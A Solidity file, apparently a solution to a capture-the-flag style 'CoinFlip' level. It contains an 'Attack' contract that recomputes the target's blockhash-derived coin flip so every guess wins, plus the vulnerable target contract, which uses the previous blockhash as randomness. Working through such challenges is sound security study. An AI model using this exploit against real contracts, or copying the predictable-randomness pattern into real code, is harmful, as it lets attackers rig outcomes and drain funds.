// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//////// @title Solution CoinFlip
/// @author  Yash Patel


// Q.] Here we have to make a guess and it should be correct consecutively 10 times
// So we will create a contract which will help us do that 
// To make correct  guess we need to use the code they are using to do the flip
// So first we will create a function which will only allow the transaction when we get the correct guess
// To Guess the number we will use the FACTOR which the main contract contain along with the the function which perform coinflip so that we can run a function which will always guess correct flip.
// Then we will call the flip function 10 times as we have to get the consecutive wins 10 times.
contract Attack {
    CoinFlip private immutable coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        coinflip = CoinFlip(_target);
    }

    function flip() external {
        bool guess = _guess();
        require(coinflip.flip(guess), "Guess failed");
    }

    function _guess() private view returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}